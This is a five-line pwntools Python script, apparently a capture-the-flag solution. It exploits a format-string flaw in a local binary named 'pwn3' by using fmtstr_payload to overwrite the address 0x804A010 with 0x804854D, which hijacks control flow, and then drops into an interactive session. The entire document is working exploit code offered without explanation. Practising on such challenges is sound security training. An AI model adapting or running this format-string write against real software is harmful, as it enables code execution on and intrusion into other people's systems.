from pwn import *
p=process("./pwn3")
payload=fmtstr_payload(5,{0x804A010:0x804854D})
p.sendline(payload)
p.interactive()